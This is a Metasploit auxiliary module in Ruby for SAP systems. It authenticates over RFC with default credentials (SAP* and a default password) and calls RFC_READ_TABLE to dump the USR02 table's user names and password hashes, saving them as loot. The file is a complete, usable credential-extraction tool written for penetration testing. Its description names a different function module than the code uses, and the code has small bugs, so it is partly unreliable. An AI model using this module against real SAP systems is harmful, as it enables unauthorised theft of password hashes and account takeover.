##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'rubygems'
begin
  require 'nwrfc'
rescue LoadError
  abort("[-] This module requires the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc) from Martin Ceronio.")
end

class Metasploit4 < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include NWRFC

  def initialize
    super(
      'Name' => 'SAP RFC Service RFC_READ_TABLE Function Dump Data',
      'Description' => %q{
          This module makes use of the RFC_ABAP_INSTALL_AND_RUN Remote Function Call (RFC)
          to extract SAP user hashes from USR02. The FM (Function Module) RFC_ABAP_INSTALL_AND_RUN 
          takes ABAP source lines and executes them. It is common for the the function to be disabled
          or access revoked in a production system. It is also deprecated. 
          The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc). 
          },                      
      'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Author' => [ 'nmonkee' ],
      'License' => MSF_LICENSE
      )

    register_options(
      [
        Opt::RPORT(3300),
        OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
        OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
        OptString.new('CLIENT', [true, 'SAP client', '001']),
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
        OptString.new('TABLE', [true, 'Table to read', 'USR02']),
        OptString.new('FIELDS', [true, 'Fields to read', 'BNAME,BCODE'])
        ], self.class)
  end

  def run_host(ip)
    fields = []
    fields << '*' if datastore['FIELDS'].nil? or datastore['FIELDS'].empty?
    if datastore['FIELDS']
      fields.push(datastore['FIELDS']) if datastore['FIELDS'] =~ /^\w?/ or datastore['FIELDS'] == '*'
      fields = datastore['FIELDS'].split(',') if datastore['FIELDS'] =~ /\w*,\w*/
    end
    rport = datastore['rport'].to_s.split('')
    sysnr = rport[2]
    sysnr << rport[3]
    conn = auth(ip,datastore['rport'],sysnr)
    exec(ip,datastore['rport'],conn,fields)
  end

  def auth(ip,rport,sysnr)
    ashost = ip
    ashost = "/H/#{datastore['SRHOST']}/H/#{ip}" if datastore['SRHOST']
    auth_hash = {"user" => datastore['USERNAME'], "passwd" => datastore['PASSWORD'], "client" => datastore['CLIENT'], "ashost" => ashost, "sysnr" => sysnr}
    begin
      conn = Connection.new(auth_hash)
      return conn
    rescue NWError => e
      case e.message.to_s
      when /Name or password is incorrect/
        print_error("[SAP] #{ip}:#{rport} - login failed}") 
      when /not available in this system/
        print_error("[SAP] #{ip}:#{rport} - client #{client} does not exist")
      when /Connection refused/
        print_error("[SAP] #{ip}:#{rport} - communication failure (refused)")
      when /No route to host/
        print_error("[SAP] #{ip}:#{rport} - communication failure (unreachable)")
      when /unknown/
        print_error("[SAP] #{ip}:#{rport} - communication failure (hostname unknown)")
      when /Password logon no longer possible - too many failed attempts/
        print_error("[SAP] #{ip}:#{rport} - user locked")
      when /Password must be changed/
        print_error("[SAP] #{ip}:#{rport} - password must be changed")
      end
    end
  end

  def exec(ip,rport,conn,fields)
    begin
      conn_info = conn.connection_info
      function = conn.get_function("RFC_READ_TABLE")
      fc = function.get_function_call
      fc[:DELIMITER] = '|'
      fc[:QUERY_TABLE] = datastore['TABLE']
      fields.each do |field|
        fc[:FIELDS].new_row {|row|
          row[:FIELDNAME] = field
        }
      end
      fc.invoke
      conn.disconnect
      saptbl = Msf::Ui::Console::Table.new(
        Msf::Ui::Console::Table::Style::Default,
        'Header' => "[SAP] RFC_READ_TABLE",
        'Prefix' => "\n",
        'Postfix' => "\n",
        'Indent' => 1,
        'Columns' => ["Returned Data"]
        )
      0.upto(fc[:DATA].size-1) do |i|
        data = fc[:DATA][i][:WA]
        saptbl << [data.to_str]
      end
    rescue NWError => e
      print_error("[SAP] #{ip}:#{rport} - FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
      return
    end

    print(saptbl.to_s)

    this_service = report_service(
      :host  => ip,
      :port => rport,
      :name => 'sap',
      :proto => 'tcp'
      )

    loot_path = store_loot("sap.tables.data", "text/plain", ip, saptbl.to_s, "#{ip}_sap_#{datastore['TABLE'].downcase}.txt", "SAP Data", this_service)
      
    print_good("[SAP] #{ip}:#{rport} - data stored in #{loot_path}")
  end
end
